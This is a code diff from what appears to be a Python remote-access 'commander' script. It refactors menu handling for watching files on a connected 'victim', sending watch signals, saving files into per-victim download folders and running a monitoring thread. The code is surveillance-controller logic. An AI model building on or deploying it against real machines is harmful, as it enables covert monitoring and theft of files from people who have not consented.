@@ -82,12 +82,8 @@ if __name__ == '__main__':
                             break
 
                         # Check if currently watching a file
-                        if status_2:
-                            print(constants.WATCH_FILE_STATUS_TRUE_ERROR.format(client_ip, client_port))
-                            print(constants.RETURN_MAIN_MENU_MSG)
-                            print(constants.MENU_CLOSING_BANNER)
+                        if is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
                             break
-
                         else:
                             # Send the notification to the victim that commander wants to watch a file
                             client_socket.send(constants.WATCH_FILE_SIGNAL.encode())
@@ -106,13 +102,17 @@ if __name__ == '__main__':
                                                                                                 client_ip,
                                                                                                 client_port))
 
-                                # Create downloads/victim_ip directory (if necessary)
+                                # a) Create downloads/victim_ip directory (if necessary)
                                 sub_directory_path = make_main_and_sub_directories(client_ip)
 
-                                # a) Update state of socket to is_watching
+                                # b) Update state of socket to is_watching
                                 connected_clients[client_socket] = (client_ip, client_port, status, True)
 
-                                # b) Create + Start a thread to monitor client socket and handle modify/deleted files
+                                # c) Check signal queue if thread has stopped due to a previous deletion event
+                                if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
+                                    global_thread = None
+
+                                # d) Create + Start a thread to monitor client socket and handle modify/deleted files
                                 if global_thread is None:
                                     global_thread = threading.Thread(target=watch_file_client_socket,
                                                                      args=(client_socket,
@@ -130,6 +130,8 @@ if __name__ == '__main__':
                             else:
                                 print(constants.CLIENT_RESPONSE.format(res[1]))
                                 pass
+
+                    # CASE 3: [Multiple Clients] Watch File for a specific connected victim
 
                     # Print closing statements
                     print(constants.RETURN_MAIN_MENU_MSG)
@@ -158,9 +160,9 @@ if __name__ == '__main__':
                             break
 
                         # Check if currently watching a file
-                        if status_2:
-                            # a) Stop Thread + Signal to client + Update Status
+                        if is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
                             try:
+                                # a) Stop Thread + Signal to client + Update Status
                                 if global_thread is not None:
                                     print(constants.THREAD_STOPPING_MSG.format(global_thread.name))
                                     print(constants.STOP_WATCH_FILE_TIP.format(client_ip, client_port))
@@ -190,7 +192,7 @@ if __name__ == '__main__':
                     print(constants.MENU_CLOSING_BANNER)
 
                 # MENU ITEM 12 - Connect to a specific victim
-                if command == constants.PERFORM_MENU_ITEM_TWELVE:
+                if command == constants.PERFORM_MENU_ITEM_FOURTEEN:
                     _, target_socket, target_ip, target_port = connect_to_client_with_prompt(sockets_to_read,
                                                                                              connected_clients)
 
